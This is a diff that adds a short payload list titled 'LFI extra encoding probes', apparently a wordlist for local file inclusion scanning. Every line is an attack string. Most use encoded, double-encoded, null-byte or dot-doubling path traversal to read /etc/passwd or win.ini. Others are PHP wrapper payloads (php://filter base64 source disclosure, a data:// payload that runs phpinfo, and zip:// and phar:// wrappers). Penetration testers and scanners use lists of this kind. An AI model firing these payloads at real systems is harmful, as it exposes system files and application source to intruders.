@@ -1,0 +1,14 @@
+# LFI extra encoding probes
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%5c..%5cwindows%5cwin.ini
+..%255c..%255cwindows%255cwin.ini
+....//....//etc/passwd
+....\....\windows\win.ini
+/etc/passwd%00
+C:%5cWindows%5cwin.ini%00
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../index.php
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+zip://archive.zip%23payload.txt
+phar://archive.phar/test.txt
